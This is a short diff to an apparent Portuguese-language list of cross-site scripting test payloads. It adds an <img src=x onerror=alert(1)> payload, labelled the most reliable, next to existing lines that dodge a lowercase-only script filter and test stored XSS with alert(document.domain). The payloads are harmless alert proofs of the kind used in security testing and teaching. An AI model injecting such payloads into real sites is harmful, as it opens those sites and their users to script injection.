@@ -12,6 +12,9 @@ Aninhado
 Maiúsculas (porque o filtro só apanha minúsculas):
 <SCRIPT>alert(1)</SCRIPT>
 
+Sem a tag script de todo (a mais fiável):
+<img src=x onerror=alert(1)>
+
 
 # ───── XSS ARMAZENADO (fica guardado) ─────
 <script>alert(document.domain)</script>
